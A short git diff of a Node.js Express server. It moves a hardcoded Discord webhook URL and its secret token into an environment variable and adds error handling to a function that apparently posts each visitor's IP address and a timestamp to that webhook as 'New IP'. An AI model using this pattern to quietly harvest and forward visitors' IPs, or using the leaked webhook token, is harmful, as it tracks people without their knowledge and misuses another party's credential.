@@ -7,11 +7,8 @@ dotenv.config();
 const app = express();
 
 const logger = async (ip, date) => {
-    const hook = "https://discord.com/api/webhooks/1492018544374710272/cSfi9E6m6MJRk4sdF_80pVwuID9CwrDLE5OoSM9etyoKjECyNRAZfD8EmF2Ytx4xrIe-";
-
-        console.log("Hook exists:", !!hook);
-
-    
+    try {
+    const hook = process.env.HOOK;
     const data = {
         "content": " ",
         "title": "New IP",
@@ -32,6 +29,9 @@ const logger = async (ip, date) => {
     }
     
     return response;
+    } catch (error) {
+        console.error("Error logging IP:", error);
+    }
 }
 
 
@@ -47,4 +47,4 @@ app.get("/", (req, res) => {
 
 app.listen(3000, () => {
   console.log("Server is running on port 3000");
-});
+})
